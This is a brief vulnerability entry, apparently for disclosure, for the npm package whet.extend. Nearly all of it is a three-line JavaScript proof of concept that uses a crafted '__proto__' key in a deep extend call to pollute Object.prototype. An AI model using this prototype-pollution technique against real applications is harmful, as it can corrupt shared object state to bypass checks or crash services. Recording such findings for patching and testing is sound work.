# whet.extend

- package name: `whet.extend`

- PoC exploit:

```javascript
var extend = require('whet.extend');
extend(true, {}, {['__proto__']: {polluted: 'yes'}});
// Object.prototype.polluted === 'yes'
```